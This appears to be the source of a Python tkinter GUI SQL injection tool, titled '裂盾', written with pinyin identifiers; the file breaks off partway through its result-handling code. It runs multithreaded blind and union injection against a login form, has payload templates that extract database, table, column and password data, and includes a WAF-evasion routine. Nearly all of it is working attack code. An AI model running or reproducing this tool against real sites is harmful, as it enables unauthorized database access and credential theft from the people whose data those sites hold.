import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import queue
import requests
import time
import re

class SQLZhuRuGongJu:
    def __init__(self, zhu_chuang_kou):
        self.zhu_chuang_kou = zhu_chuang_kou
        self.zhu_chuang_kou.title("裂盾")
        self.zhu_chuang_kou.geometry("900x700")
        self.zhu_chuang_kou.resizable(True, True)
        
        self.bei_jing_se = "#f8f9fa"
        self.gao_liang_se = "#3f51b5"
        self.cheng_gong_se = "#4caf50"
        self.cuo_wu_se = "#f44336"
        self.jing_gao_se = "#ffeb3b"
        self.qiang_diao_se = "#2196f3"
        self.wen_ben_se = "#212529"
        
        self.zhu_chuang_kou.configure(bg=self.bei_jing_se)
        
        self.gong_ji_yun_xing_zhong = False
        self.xian_cheng_lie_biao = []
        self.jie_guo_dui_lie = queue.Queue()
        
        self.bao_po_zi_fu = {}
        self.que_ren_zi_fu = {}
        self.zui_zhong_jie_guo = ""
        self.xiang_ying_chang_du_zi_dian = {}
        self.xiang_ying_chang_du_tong_ji = {}
        self.gong_ji_kai_shi_shi_jian = 0
        self.gong_ji_hao_shi = 0
        
        self.chuang_jian_kong_jian()
        self.bu_ju_she_zhi()
        
    def chuang_jian_kong_jian(self):
        self.mu_biao_kuang_jia = ttk.LabelFrame(self.zhu_chuang_kou, text="目标设置")
        
        self.wang_zhi_biao_qian = tk.Label(self.mu_biao_kuang_jia, text="目标URL:", font=("Helvetica", 10))
        self.wang_zhi_shu_ru_kuang = tk.Entry(self.mu_biao_kuang_jia, width=50, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        self.wang_zhi_shu_ru_kuang.insert(0, "http://localhost/login.php")
        
        self.zhu_ru_dian_biao_qian = tk.Label(self.mu_biao_kuang_jia, text="注入点:", font=("Helvetica", 10))
        self.zhu_ru_dian_bian_liang = tk.StringVar(value="username")
        self.zhu_ru_dian_xia_la_kuang = ttk.Combobox(self.mu_biao_kuang_jia, textvariable=self.zhu_ru_dian_bian_liang, font=("Consolas", 10), width=20)
        self.zhu_ru_dian_xia_la_kuang['values'] = ('username', 'password')
        
        self.gong_ji_lei_xing_biao_qian = tk.Label(self.mu_biao_kuang_jia, text="攻击类型:", font=("Helvetica", 10))
        self.gong_ji_lei_xing_bian_liang = tk.StringVar(value="布尔盲注")
        self.gong_ji_lei_xing_xia_la_kuang = ttk.Combobox(self.mu_biao_kuang_jia, textvariable=self.gong_ji_lei_xing_bian_liang, font=("Consolas", 10), width=20)
        self.gong_ji_lei_xing_xia_la_kuang['values'] = ('布尔盲注', '时间盲注', '联合查询注入')
        
        self.xian_cheng_kuang_jia = ttk.LabelFrame(self.zhu_chuang_kou, text="基础设置")
        
        self.xian_cheng_bian_liang = tk.IntVar(value=50)
        
        self.yan_chi_biao_qian = tk.Label(self.xian_cheng_kuang_jia, text="请求延迟(秒):", font=("Helvetica", 10))
        self.yan_chi_bian_liang = tk.DoubleVar(value=0.5)
        self.yan_chi_hua_kuai = tk.Scale(self.xian_cheng_kuang_jia, from_=0, to=5.0, orient=tk.HORIZONTAL, 
                                   resolution=0.1, variable=self.yan_chi_bian_liang, length=200,
                                   bg=self.bei_jing_se, highlightbackground=self.bei_jing_se,
                                   troughcolor="#e0e0e0", activebackground=self.qiang_diao_se)
        
        self.wei_zhi_biao_qian = tk.Label(self.xian_cheng_kuang_jia, text="爆破位数:", font=("Helvetica", 10))
        self.qi_shi_wei_zhi_biao_qian = tk.Label(self.xian_cheng_kuang_jia, text="起始位置:", font=("Helvetica", 10))
        self.qi_shi_wei_zhi_bian_liang = tk.IntVar(value=1)
        self.qi_shi_wei_zhi_shu_ru_kuang = tk.Entry(self.xian_cheng_kuang_jia, textvariable=self.qi_shi_wei_zhi_bian_liang, 
                                           width=5, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        
        self.jie_shu_wei_zhi_biao_qian = tk.Label(self.xian_cheng_kuang_jia, text="结束位置:", font=("Helvetica", 10))
        self.jie_shu_wei_zhi_bian_liang = tk.IntVar(value=10)
        self.jie_shu_wei_zhi_shu_ru_kuang = tk.Entry(self.xian_cheng_kuang_jia, textvariable=self.jie_shu_wei_zhi_bian_liang, 
                                         width=5, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        
        self.zai_he_kuang_jia = ttk.LabelFrame(self.zhu_chuang_kou, text="Payload设置")
        
        self.zai_he_lei_xing_biao_qian = tk.Label(self.zai_he_kuang_jia, text="Payload类型:", font=("Helvetica", 10))
        self.zai_he_lei_xing_bian_liang = tk.StringVar(value="自定义")
        self.zai_he_lei_xing_xia_la_kuang = ttk.Combobox(self.zai_he_kuang_jia, textvariable=self.zai_he_lei_xing_bian_liang, 
                                             width=40, font=("Consolas", 10))
        self.zai_he_lei_xing_xia_la_kuang['values'] = (
            '自定义', 
            '获取数据库名', 
            '获取表名', 
            '获取列名', 
            '获取用户名或密码', 
        )
        self.zai_he_lei_xing_xia_la_kuang.bind('<<ComboboxSelected>>', self.geng_xin_zai_he_mo_ban)
        
        self.shu_ju_ku_can_shu_kuang_jia = tk.Frame(self.zai_he_kuang_jia, bd=2, relief=tk.GROOVE, bg="#f0f7ff", padx=5, pady=5)
        
        self.shu_ju_ku_can_shu_ti_shi = tk.Label(self.shu_ju_ku_can_shu_kuang_jia, text="请在下方输入数据库参数信息", 
                                    font=("Helvetica", 10, "italic"), fg="#1565c0", bg="#f0f7ff")
        self.shu_ju_ku_can_shu_ti_shi.grid(row=0, column=0, columnspan=4, padx=8, pady=4, sticky=tk.W)
        
        self.shu_ju_ku_ming_biao_qian = tk.Label(self.shu_ju_ku_can_shu_kuang_jia, text="数据库名:", font=("Helvetica", 10, "bold"))
        self.shu_ju_ku_ming_bian_liang = tk.StringVar(value="")
        self.shu_ju_ku_ming_shu_ru_kuang = tk.Entry(self.shu_ju_ku_can_shu_kuang_jia, textvariable=self.shu_ju_ku_ming_bian_liang, 
                                    width=20, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        self.shu_ju_ku_ming_shu_ru_kuang.insert(0, "请输入数据库名")
        self.shu_ju_ku_ming_shu_ru_kuang.config(fg="gray")
        
        def shu_ju_ku_ming_huo_de_jiao_dian(shi_jian):
            if self.shu_ju_ku_ming_shu_ru_kuang.get() == "请输入数据库名":
                self.shu_ju_ku_ming_shu_ru_kuang.delete(0, tk.END)
                self.shu_ju_ku_ming_shu_ru_kuang.config(fg="black")
                
        def shu_ju_ku_ming_shi_qu_jiao_dian(shi_jian):
            if not self.shu_ju_ku_ming_shu_ru_kuang.get():
                self.shu_ju_ku_ming_shu_ru_kuang.insert(0, "请输入数据库名")
                self.shu_ju_ku_ming_shu_ru_kuang.config(fg="gray")
                
        self.shu_ju_ku_ming_shu_ru_kuang.bind("<FocusIn>", shu_ju_ku_ming_huo_de_jiao_dian)
        self.shu_ju_ku_ming_shu_ru_kuang.bind("<FocusOut>", shu_ju_ku_ming_shi_qu_jiao_dian)
        
        self.biao_ming_biao_qian = tk.Label(self.shu_ju_ku_can_shu_kuang_jia, text="表名:", font=("Helvetica", 10, "bold"))
        self.biao_ming_bian_liang = tk.StringVar(value="")
        self.biao_ming_shu_ru_kuang = tk.Entry(self.shu_ju_ku_can_shu_kuang_jia, textvariable=self.biao_ming_bian_liang, 
                                       width=20, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        self.biao_ming_shu_ru_kuang.insert(0, "请输入表名")
        self.biao_ming_shu_ru_kuang.config(fg="gray")
        
        def biao_ming_huo_de_jiao_dian(shi_jian):
            if self.biao_ming_shu_ru_kuang.get() == "请输入表名":
                self.biao_ming_shu_ru_kuang.delete(0, tk.END)
                self.biao_ming_shu_ru_kuang.config(fg="black")
                
        def biao_ming_shi_qu_jiao_dian(shi_jian):
            if not self.biao_ming_shu_ru_kuang.get():
                self.biao_ming_shu_ru_kuang.insert(0, "请输入表名")
                self.biao_ming_shu_ru_kuang.config(fg="gray")
                
        self.biao_ming_shu_ru_kuang.bind("<FocusIn>", biao_ming_huo_de_jiao_dian)
        self.biao_ming_shu_ru_kuang.bind("<FocusOut>", biao_ming_shi_qu_jiao_dian)
        
        self.zi_duan_ming_biao_qian = tk.Label(self.shu_ju_ku_can_shu_kuang_jia, text="字段名:", font=("Helvetica", 10, "bold"))
        self.zi_duan_ming_bian_liang = tk.StringVar(value="")
        self.zi_duan_ming_shu_ru_kuang = tk.Entry(self.shu_ju_ku_can_shu_kuang_jia, textvariable=self.zi_duan_ming_bian_liang, 
                                        width=20, font=("Consolas", 10), bd=2, relief=tk.GROOVE)
        self.zi_duan_ming_shu_ru_kuang.insert(0, "请输入字段名")
        self.zi_duan_ming_shu_ru_kuang.config(fg="gray")
        
        def zi_duan_ming_huo_de_jiao_dian(shi_jian):
            if self.zi_duan_ming_shu_ru_kuang.get() == "请输入字段名":
                self.zi_duan_ming_shu_ru_kuang.delete(0, tk.END)
                self.zi_duan_ming_shu_ru_kuang.config(fg="black")
                
        def zi_duan_ming_shi_qu_jiao_dian(shi_jian):
            if not self.zi_duan_ming_shu_ru_kuang.get():
                self.zi_duan_ming_shu_ru_kuang.insert(0, "请输入字段名")
                self.zi_duan_ming_shu_ru_kuang.config(fg="gray")
                
        self.zi_duan_ming_shu_ru_kuang.bind("<FocusIn>", zi_duan_ming_huo_de_jiao_dian)
        self.zi_duan_ming_shu_ru_kuang.bind("<FocusOut>", zi_duan_ming_shi_qu_jiao_dian)
        
        self.zai_he_wen_ben_kuang = scrolledtext.ScrolledText(self.zai_he_kuang_jia, width=70, height=5, 
                                                    font=("Consolas", 10), bd=2, relief=tk.GROOVE,
                                                    padx=8, pady=8, wrap=tk.WORD)
        self.zai_he_wen_ben_kuang.insert(tk.END, "' OR '1'='1")
        
        self.rao_guo_WAF_bian_liang = tk.BooleanVar(value=True)
        self.rao_guo_WAF_fu_xuan_kuang = tk.Checkbutton(self.zai_he_kuang_jia, text="尝试绕过WAF", 
                                              variable=self.rao_guo_WAF_bian_liang,
                                              font=("Helvetica", 10), bg=self.bei_jing_se,
                                              activebackground=self.bei_jing_se)
        
        self.an_niu_kuang_jia = tk.Frame(self.zhu_chuang_kou, bg=self.bei_jing_se)
        
        def chuang_jian_an_niu_yang_shi(an_niu, xuan_ting_yan_se):
            def shu_biao_jin_ru(shi_jian):
                an_niu['background'] = xuan_ting_yan_se
            def shu_biao_li_kai(shi_jian):
                an_niu['background'] = an_niu.chu_shi_bei_jing_se
            an_niu.bind("<Enter>", shu_biao_jin_ru)
            an_niu.bind("<Leave>", shu_biao_li_kai)
            an_niu.chu_shi_bei_jing_se = an_niu['background']
        
        self.kai_shi_an_niu = tk.Button(self.an_niu_kuang_jia, text="开始攻击", command=self.kai_shi_gong_ji, 
                                     bg=self.cheng_gong_se, fg="white", width=15, height=2,
                                     font=("Helvetica", 11, "bold"), relief=tk.FLAT, bd=0,
                                     cursor="hand2", padx=10, pady=5)
        chuang_jian_an_niu_yang_shi(self.kai_shi_an_niu, "#388e3c")
        
        self.ting_zhi_an_niu = tk.Button(self.an_niu_kuang_jia, text="停止攻击", command=self.ting_zhi_gong_ji, 
                                    bg=self.cuo_wu_se, fg="white", width=15, height=2, state=tk.DISABLED,
                                    font=("Helvetica", 11, "bold"), relief=tk.FLAT, bd=0,
                                    cursor="hand2", padx=10, pady=5)
        chuang_jian_an_niu_yang_shi(self.ting_zhi_an_niu, "#d32f2f")
        
        self.qing_chu_an_niu = tk.Button(self.an_niu_kuang_jia, text="清空结果", command=self.qing_chu_jie_guo, 
                                     bg=self.qiang_diao_se, fg="white", width=15, height=2,
                                     font=("Helvetica", 11, "bold"), relief=tk.FLAT, bd=0,
                                     cursor="hand2", padx=10, pady=5)
        chuang_jian_an_niu_yang_shi(self.qing_chu_an_niu, "#1976d2")
        
        self.jie_guo_kuang_jia = ttk.LabelFrame(self.zhu_chuang_kou, text="攻击结果")
        self.jie_guo_wen_ben_kuang = scrolledtext.ScrolledText(self.jie_guo_kuang_jia, width=90, height=15,
                                                   font=("Consolas", 10), bg="#ffffff",
                                                   padx=8, pady=8, wrap=tk.WORD)
        self.jie_guo_wen_ben_kuang.config(state=tk.DISABLED)
        
        try:
            gun_dong_tiao = self.jie_guo_wen_ben_kuang.vbar
            if hasattr(gun_dong_tiao, 'config'):
                gun_dong_tiao.config(troughcolor=self.bei_jing_se, bg=self.qiang_diao_se,
                              activebackground=self.gao_liang_se, width=12)
        except (AttributeError, Exception):
            pass
        
        self.bao_po_jie_guo_kuang_jia = ttk.LabelFrame(self.zhu_chuang_kou, text="查询结果")
        self.bao_po_jie_guo_bian_liang = tk.StringVar(value="等待查询...")
        self.bao_po_jie_guo_biao_qian = tk.Label(self.bao_po_jie_guo_kuang_jia, textvariable=self.bao_po_jie_guo_bian_liang, 
                                           font=("Consolas", 12, "bold"), bg="#e8f5e9", fg="#2e7d32", relief=tk.GROOVE, 
                                           width=70, height=2, anchor=tk.W, padx=10, pady=10,
                                           borderwidth=2)
        
        self.zhuang_tai_bian_liang = tk.StringVar(value="就绪")
        self.zhuang_tai_lan = tk.Label(self.zhu_chuang_kou, textvariable=self.zhuang_tai_bian_liang, bd=1, 
                                  relief=tk.FLAT, anchor=tk.W, bg=self.gao_liang_se,
                                  fg="white", padx=10, pady=3, font=("Helvetica", 9))
        
    def bu_ju_she_zhi(self):
        self.mu_biao_kuang_jia.pack(fill=tk.X, padx=15, pady=8)
        self.wang_zhi_biao_qian.grid(row=0, column=0, padx=8, pady=8, sticky=tk.W)
        self.wang_zhi_shu_ru_kuang.grid(row=0, column=1, padx=8, pady=8, sticky=tk.W)
        self.zhu_ru_dian_biao_qian.grid(row=1, column=0, padx=8, pady=8, sticky=tk.W)
        self.zhu_ru_dian_xia_la_kuang.grid(row=1, column=1, padx=8, pady=8, sticky=tk.W)
        self.gong_ji_lei_xing_biao_qian.grid(row=2, column=0, padx=8, pady=8, sticky=tk.W)
        self.gong_ji_lei_xing_xia_la_kuang.grid(row=2, column=1, padx=8, pady=8, sticky=tk.W)
        
        self.xian_cheng_kuang_jia.pack(fill=tk.X, padx=15, pady=8)
        self.yan_chi_biao_qian.grid(row=0, column=0, padx=8, pady=8, sticky=tk.W)
        self.yan_chi_hua_kuai.grid(row=0, column=1, padx=8, pady=8, sticky=tk.W)
        
        self.wei_zhi_biao_qian.grid(row=1, column=0, padx=8, pady=8, sticky=tk.W)
        self.qi_shi_wei_zhi_biao_qian.grid(row=1, column=1, padx=8, pady=8, sticky=tk.W)
        self.qi_shi_wei_zhi_shu_ru_kuang.grid(row=1, column=2, padx=8, pady=8, sticky=tk.W)
        self.jie_shu_wei_zhi_biao_qian.grid(row=2, column=1, padx=8, pady=8, sticky=tk.W)
        self.jie_shu_wei_zhi_shu_ru_kuang.grid(row=2, column=2, padx=8, pady=8, sticky=tk.W)
        
        self.zai_he_kuang_jia.pack(fill=tk.X, padx=15, pady=8)
        self.zai_he_lei_xing_biao_qian.grid(row=0, column=0, padx=8, pady=8, sticky=tk.W)
        self.zai_he_lei_xing_xia_la_kuang.grid(row=0, column=1, padx=8, pady=8, sticky=tk.W)
        
        self.shu_ju_ku_can_shu_kuang_jia.grid(row=1, column=0, columnspan=2, padx=8, pady=8, sticky=tk.W)
        self.shu_ju_ku_ming_biao_qian.grid(row=1, column=0, padx=8, pady=8, sticky=tk.W)
        self.shu_ju_ku_ming_shu_ru_kuang.grid(row=1, column=1, padx=8, pady=8, sticky=tk.W)
        self.biao_ming_biao_qian.grid(row=1, column=2, padx=8, pady=8, sticky=tk.W)
        self.biao_ming_shu_ru_kuang.grid(row=1, column=3, padx=8, pady=8, sticky=tk.W)
        self.zi_duan_ming_biao_qian.grid(row=2, column=0, padx=8, pady=8, sticky=tk.W)
        self.zi_duan_ming_shu_ru_kuang.grid(row=2, column=1, padx=8, pady=8, sticky=tk.W)
        
        self.zai_he_wen_ben_kuang.grid(row=3, column=0, columnspan=2, padx=8, pady=8, sticky=tk.W+tk.E)
        self.rao_guo_WAF_fu_xuan_kuang.grid(row=4, column=0, padx=8, pady=8, sticky=tk.W)
        
        self.bao_po_jie_guo_kuang_jia.pack(fill=tk.X, padx=15, pady=8)
        self.bao_po_jie_guo_biao_qian.pack(padx=8, pady=8, fill=tk.X)
        
        self.an_niu_kuang_jia.pack(pady=10)
        self.kai_shi_an_niu.pack(side=tk.LEFT, padx=15)
        self.ting_zhi_an_niu.pack(side=tk.LEFT, padx=15)
        self.qing_chu_an_niu.pack(side=tk.LEFT, padx=15)
        
        self.jie_guo_kuang_jia.pack(fill=tk.BOTH, expand=True, padx=15, pady=8)
        self.jie_guo_wen_ben_kuang.pack(padx=8, pady=8, fill=tk.BOTH, expand=True)
        
        self.zhuang_tai_lan.pack(side=tk.BOTTOM, fill=tk.X)
    
    def ji_lu_xiao_xi(self, xiao_xi):
        self.jie_guo_wen_ben_kuang.config(state=tk.NORMAL)
        self.jie_guo_wen_ben_kuang.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {xiao_xi}\n")
        self.jie_guo_wen_ben_kuang.see(tk.END)
        self.jie_guo_wen_ben_kuang.config(state=tk.DISABLED)
    
    def geng_xin_zhuang_tai(self, xiao_xi):
        self.zhuang_tai_bian_liang.set(xiao_xi)
    
    def qing_chu_jie_guo(self):
        self.jie_guo_wen_ben_kuang.config(state=tk.NORMAL)
        self.jie_guo_wen_ben_kuang.delete(1.0, tk.END)
        self.jie_guo_wen_ben_kuang.config(state=tk.DISABLED)
        
        self.bao_po_zi_fu = {}
        self.que_ren_zi_fu = {}
        self.zui_zhong_jie_guo = ""
        self.xiang_ying_chang_du_zi_dian = {}
        self.xiang_ying_chang_du_tong_ji = {}
        self.bao_po_jie_guo_bian_liang.set("等待查询...")
        self.bao_po_jie_guo_biao_qian.config(bg="#e8f5e9", fg="#2e7d32", font=("Consolas", 12, "bold"))
        
    def geng_xin_zai_he_mo_ban(self, shi_jian=None):
        zai_he_lei_xing = self.zai_he_lei_xing_bian_liang.get()
        
        shu_ju_ku_ming = self.shu_ju_ku_ming_bian_liang.get()
        if shu_ju_ku_ming == "请输入数据库名":
            shu_ju_ku_ming = ""
            
        biao_ming = self.biao_ming_bian_liang.get()
        if biao_ming == "请输入表名":
            biao_ming = ""
            
        zi_duan_ming = self.zi_duan_ming_bian_liang.get()
        if zi_duan_ming == "请输入字段名":
            zi_duan_ming = ""
        
        self.zai_he_wen_ben_kuang.delete(1.0, tk.END)
        
        if zai_he_lei_xing == "获取数据库名":
            zai_he = "'or substr(database()from({})for(1))='{}'#"
            self.zai_he_wen_ben_kuang.insert(tk.END, zai_he)
            self.ji_lu_xiao_xi("已加载获取数据库名的payload模板，请在攻击时传入位置和字符参数")
            
        elif zai_he_lei_xing == "获取表名":
            zai_he = f"'or substr((select group_concat(table_name) from information_schema.tables where table_schema='{shu_ju_ku_ming}')from({{}})for(1))='{{}}'#"
            self.zai_he_wen_ben_kuang.insert(tk.END, zai_he)
            self.ji_lu_xiao_xi(f"已加载获取表名的payload模板，使用数据库名: {shu_ju_ku_ming}")
            
        elif zai_he_lei_xing == "获取列名":
            zai_he = f"'or substr((select group_concat(column_name) from information_schema.columns where table_name='{biao_ming}')from({{}})for(1))='{{}}'#"
            self.zai_he_wen_ben_kuang.insert(tk.END, zai_he)
            self.ji_lu_xiao_xi(f"已加载获取列名的payload模板，使用表名: {biao_ming}")
            
        elif zai_he_lei_xing == "获取用户名或密码":
            if biao_ming and zi_duan_ming:
                zai_he = f"'or substr((select group_concat({zi_duan_ming}) from {biao_ming})from({{}})for(1))='{{}}'#"
                self.zai_he_wen_ben_kuang.insert(tk.END, zai_he)
                self.ji_lu_xiao_xi(f"已加载获取用户名或密码的payload模板，使用表名: {biao_ming}, 字段名: {zi_duan_ming}")
            else:
                zai_he = "'or substr((select group_concat({column}) from {table})from({})for(1))='{}'#"
                self.zai_he_wen_ben_kuang.insert(tk.END, zai_he)
                self.ji_lu_xiao_xi("警告：请确保已输入有效的表名和字段名，否则查询可能失败")
                self.ji_lu_xiao_xi("提示：请在字段名输入框中输入要查询的字段(如password)，在表名输入框中输入表名(如user)")
            
        elif zai_he_lei_xing == "自定义":
            self.zai_he_wen_ben_kuang.insert(tk.END, "' OR '1'='1")
            self.ji_lu_xiao_xi("已切换到自定义payload模式")
    
    def chu_li_te_shu_zi_fu(self, zai_he):
        if not self.rao_guo_WAF_bian_liang.get():
            return zai_he
            
        chu_li_hou_de_zai_he = zai_he
        
        chu_li_hou_de_zai_he = re.sub(r'union', r'UN/**/ION', chu_li_hou_de_zai_he, flags=re.IGNORECASE)
        
        chu_li_hou_de_zai_he = re.sub(r'\band\b', r'&&', chu_li_hou_de_zai_he, flags=re.IGNORECASE)
        
        chu_li_hou_de_zai_he = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(chu_li_hou_de_zai_he)])
        
        return chu_li_hou_de_zai_he
    
    def gong_zuo_xian_cheng(self, xian_cheng_ID, mu_biao_wang_zhi, zhu_ru_dian, gong_ji_lei_xing, zai_he, yan_chi, qi_shi_wei_zhi, jie_shu_wei_zhi, xian_cheng_shu):
        zi_fu_ji = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ()_=+"
        
        zong_wei_zhi_shu = jie_shu_wei_zhi - qi_shi_wei_zhi + 1
        mei_ge_xian_cheng_wei_zhi_shu = zong_wei_zhi_shu // xian_cheng_shu + (1 if zong_wei_zhi_shu % xian_cheng_shu > 0 else 0)
        
        xian_cheng_qi_shi_wei_zhi = qi_shi_wei_zhi + (xian_cheng_ID - 1) * mei_ge_xian_cheng_wei_zhi_shu
        xian_cheng_jie_shu_wei_zhi = min(xian_cheng_qi_shi_wei_zhi + mei_ge_xian_cheng_wei_zhi_shu - 1, jie_shu_wei_zhi)
        
        self.ji_lu_xiao_xi(f"线程 {xian_cheng_ID} 负责爆破位置范围: {xian_cheng_qi_shi_wei_zhi}-{xian_cheng_jie_shu_wei_zhi}")
        
        dang_qian_wei_zhi = xian_cheng_qi_shi_wei_zhi
        
        session = requests.Session()
        
        while self.gong_ji_yun_xing_zhong:
            if dang_qian_wei_zhi > xian_cheng_jie_shu_wei_zhi:
                self.jie_guo_dui_lie.put({
                    "xian_cheng_ID": xian_cheng_ID,
                    "xiao_xi": f"线程 {xian_cheng_ID} 已完成指定位置范围的爆破 ({xian_cheng_qi_shi_wei_zhi}-{xian_cheng_jie_shu_wei_zhi})"
                })
                break
                
            try:
                dang_qian_zai_he = zai_he
                if "{}" in zai_he and gong_ji_lei_xing == "布尔盲注":
                    zi_fu_pi_pei = False
                    
                    for zi_fu in zi_fu_ji:
                        dang_qian_zai_he = zai_he.format(dang_qian_wei_zhi, zi_fu)
                        
                        shu_ju = {}
                        if zhu_ru_dian == "username":
                            chu_li_hou_de_zai_he = self.chu_li_te_shu_zi_fu(dang_qian_zai_he)
                            shu_ju = {"username": chu_li_hou_de_zai_he, "password": "anything"}
                        else:
                            shu_ju = {"username": "anything", "password": dang_qian_zai_he}
                        
                        kai_shi_shi_jian = time.time()
                        xiang_ying = session.post(mu_biao_wang_zhi, data=shu_ju, timeout=5)
                        hao_shi = time.time() - kai_shi_shi_jian
                        
                        jie_guo = {
                            "xian_cheng_ID": xian_cheng_ID,
                            "zai_he": dang_qian_zai_he,
                            "zhuang_tai_ma": xiang_ying.status_code,
                            "xiang_ying_shi_jian": hao_shi,
                            "xiang_ying_chang_du": len(xiang_ying.text),
                            "xiang_ying_wen_ben": xiang_ying.text[:100] + "..." if len(xiang_ying.text) > 100 else xiang_ying.text,
                            "wei_zhi": dang_qian_wei_zhi,
                            "zi_fu": zi_fu
                        }
                        
                        if "isadmin" in xiang_ying.text or "nb.php" in xiang_ying.text:
                            zi_fu_pi_pei = True
                            jie_guo["pi_pei"] = True
                        
                        self.jie_guo_dui_lie.put(jie_guo)
                        
                        if yan_chi > 0.1:
                            time.sleep(max(0.05, yan_chi * 0.5))
                        else:
                            time.sleep(yan_chi)
                        
                        if not self.gong_ji_yun_xing_zhong:
                            break
                    
                    if not zi_fu_pi_pei:
                        self.jie_guo_dui_lie.put({
                            "xian_cheng_ID": xian_cheng_ID,
                            "xiao_xi": f"位置 {dang_qian_wei_zhi} 没有匹配的字符，继续爆破下一个位置",
                            "wei_zhi": dang_qian_wei_zhi,
                            "wu_pi_pei": False
                        })
                    
                    dang_qian_wei_zhi += 1
                else:
                    shu_ju = {}
                    if zhu_ru_dian == "username":
                        chu_li_hou_de_zai_he = self.chu_li_te_shu_zi_fu(dang_qian_zai_he)
                        shu_ju = {"username": chu_li_hou_de_zai_he, "password": "anything"}
                    else:
                        shu_ju = {"username": "anything", "password": dang_qian_zai_he}
                    
                    kai_shi_shi_jian = time.time()
                    xiang_ying = session.post(mu_biao_wang_zhi, data=shu_ju, timeout=5)
                    hao_shi = time.time() - kai_shi_shi_jian
                    
                    jie_guo = {
                        "xian_cheng_ID": xian_cheng_ID,
                        "zai_he": dang_qian_zai_he,
                        "zhuang_tai_ma": xiang_ying.status_code,
                        "xiang_ying_shi_jian": hao_shi,
                        "xiang_ying_chang_du": len(xiang_ying.text),
                        "xiang_ying_wen_ben": xiang_ying.text[:100] + "..." if len(xiang_ying.text) > 100 else xiang_ying.text
                    }
                    
                    self.jie_guo_dui_lie.put(jie_guo)
                    
                    if yan_chi > 0.1:
                        time.sleep(max(0.05, yan_chi * 0.5))
                    else:
                        time.sleep(yan_chi)
                
            except requests.RequestException as yi_chang:
                self.jie_guo_dui_lie.put({
                    "xian_cheng_ID": xian_cheng_ID,
                    "cuo_wu": f"请求错误: {str(yi_chang)}"
                })
                time.sleep(max(0.1, yan_chi))
            except Exception as yi_chang:
                self.jie_guo_dui_lie.put({
                    "xian_cheng_ID": xian_cheng_ID,
                    "cuo_wu": str(yi_chang)
                })
                time.sleep(max(0.1, yan_chi))
    
    def chu_li_jie_guo(self):
        self.xiang_ying_chang_du_zi_dian = {}
        self.xiang_ying_chang_du_tong_ji = {}
        wu_pi_pei_biao_zhi = False
        
        while self.gong_ji_yun_xing_zhong or not self.jie_guo_dui_lie.empty():
            try:
                jie_guo = self.jie_guo_dui_lie.get(block=False)
                
                if self.gong_ji_kai_shi_shi_jian > 0:
                    dang_qian_hao_shi = time.time() - self.gong_ji_kai_shi_shi_jian
                    if self.zui_zhong_jie_guo:
                        self.bao_po_jie_guo_bian_liang.set(f"最终爆破结果: {self.zui_zhong_jie_guo}\n总耗时: {dang_qian_hao_shi:.2f}秒")
                
                if "cuo_wu" in jie_guo:
                    self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} 错误: {jie_guo['cuo_wu']}")
                elif "xiao_xi" in jie_guo:
                    self.ji_lu_xiao_xi(jie_guo["xiao_xi"])
                    
                    if "wu_pi_pei" in jie_guo and jie_guo["wei_zhi"]:
                        self.ji_lu_xiao_xi(f"提示: 位置 {jie_guo['wei_zhi']} 没有匹配的字符，继续爆破下一个位置")
                        self.bao_po_jie_guo_bian_liang.set(f"位置 {jie_guo['wei_zhi']} 没有匹配的字符，继续爆破\n总耗时: {dang_qian_hao_shi:.2f}秒")
                        self.bao_po_jie_guo_biao_qian.config(bg="#fff8e1", fg="#f57f17")
                else:
                    if self.gong_ji_lei_xing_bian_liang.get() == "布尔盲注":
                        if "wei_zhi" in jie_guo and "zi_fu" in jie_guo:
                            wei_zhi = jie_guo['wei_zhi']
                            zi_fu = jie_guo['zi_fu']
                            xiang_ying_chang_du = jie_guo['xiang_ying_chang_du']
                            
                            if wei_zhi not in self.xiang_ying_chang_du_zi_dian:
                                self.xiang_ying_chang_du_zi_dian[wei_zhi] = {}
                            
                            self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu] = xiang_ying_chang_du
                            
                            if "isadmin" in jie_guo["xiang_ying_wen_ben"] or "nb.php" in jie_guo["xiang_ying_wen_ben"]:
                                self.ji_lu_xiao_xi(f"[成功] 位置 {wei_zhi} 的字符是 '{zi_fu}' - 线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']}")
                                
                                self.bao_po_zi_fu[wei_zhi] = zi_fu
                                self.que_ren_zi_fu[wei_zhi] = zi_fu
                                
                                self.zhu_chuang_kou.after(0, self.geng_xin_bao_po_jie_guo)
                            else:
                                self.fen_xi_xiang_ying_chang_du(wei_zhi)
                                
                                self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - 位置 {wei_zhi} 尝试字符 '{zi_fu}' - 响应长度: {xiang_ying_chang_du}")
                        else:
                            if "isadmin" in jie_guo["xiang_ying_wen_ben"] or "nb.php" in jie_guo["xiang_ying_wen_ben"]:
                                self.ji_lu_xiao_xi(f"[成功] 线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']}")
                            else:
                                self.ji_lu_xiao_xi(f"线程 {jie_guo['xian_cheng_ID']} - Payload: {jie_guo['zai_he']} - 响应长度: {jie_guo['xiang_ying_chang_du']}")
                    
                    elif self.gong_ji_lei_xing_bian_liang.get() == "时间盲注":
                        if "wei_zhi" in jie_guo and "zi_fu" in jie_guo:
                            wei_zhi = jie_guo['wei_zhi']
                            zi_fu = jie_guo['zi_fu']
                            xiang_ying_shi_jian = jie_guo['xiang_ying_shi_jian']
                            
                            if wei_zhi not in self.xiang_ying_chang_du_zi_dian:
                                self.xiang_ying_chang_du_zi_dian[wei_zhi] = {}
                            
                            self.xiang_ying_chang_du_zi_dian[wei_zhi][zi_fu] = xiang_ying_shi_jian
                            
                            if jie_guo["xiang_ying_shi_jian"] > 2.0:
                                self.ji_lu_xiao_xi(f"[可能成功] 线程 {jie_guo['xian_cheng_ID']} - 位置 {wei_zhi} 的字符是 '{zi_fu}' - 响应时间: {xiang_ying_shi_jian:.2f}秒")
                                
